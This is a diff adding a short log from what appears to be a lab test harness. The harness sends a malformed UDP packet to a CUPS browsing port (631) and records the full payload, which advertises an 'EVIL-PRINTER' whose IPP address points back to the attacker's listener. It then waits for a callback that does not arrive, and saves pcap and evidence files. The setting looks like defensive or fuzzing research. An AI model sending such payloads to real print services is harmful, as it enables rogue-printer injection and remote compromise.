@@ -1,0 +1,7 @@
+2026-11-15 13:46:11,514 INFO IPP callback listener up on 10.13.37.66:16312
+2026-11-15 13:46:11,817 INFO [malformed] sending UDP 10.13.37.66:0 -> 10.13.37.10:631 (101 bytes) src_spoofed=False
+2026-11-15 13:46:11,817 DEBUG payload: b'ZZZZ ---- ipp://10.13.37.66:16312/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-15 13:46:11,905 INFO waiting up to 5s for the victim to connect back...
+2026-11-15 13:46:18,979 INFO wrote 1 packets to /lab/pcap_files/attack_variant2_malformed_bad-hex-type.pcap
+2026-11-15 13:46:18,979 INFO RESULT: no callback observed within 5s
+2026-11-15 13:46:18,980 INFO wrote run summary to /lab/evidence/attack_variant2_bad-hex-type_summary.json
